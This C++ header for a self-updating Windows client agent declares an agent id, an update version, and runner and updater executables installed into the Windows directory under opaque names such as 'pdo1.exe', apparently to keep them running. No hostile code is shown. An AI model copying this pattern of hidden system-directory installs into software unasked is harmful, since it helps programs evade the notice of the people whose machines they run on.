#pragma once
#include <string>
#include <ShellAPI.h>

// Agent Id is the agent unique identificator
// Must be in AAM databes
const int agent_id = 1,

// File Version must change very time when
// Need to send update to clients
agent_file_version = 93;

const std::wstring runner_path		= std::wstring(_wgetenv(L"WINDIR")) + L"\\pdo" + std::to_wstring(agent_id) + L".exe";
const std::wstring updater_path		= std::wstring(_wgetenv(L"WINDIR")) + L"\\lmk" + std::to_wstring(agent_id) + L".exe";

extern bool UpdateTime;
extern SHELLEXECUTEINFO RunKeeperExecInfo;
extern bool readyToUpdate;
extern int timeout;
extern int counter;
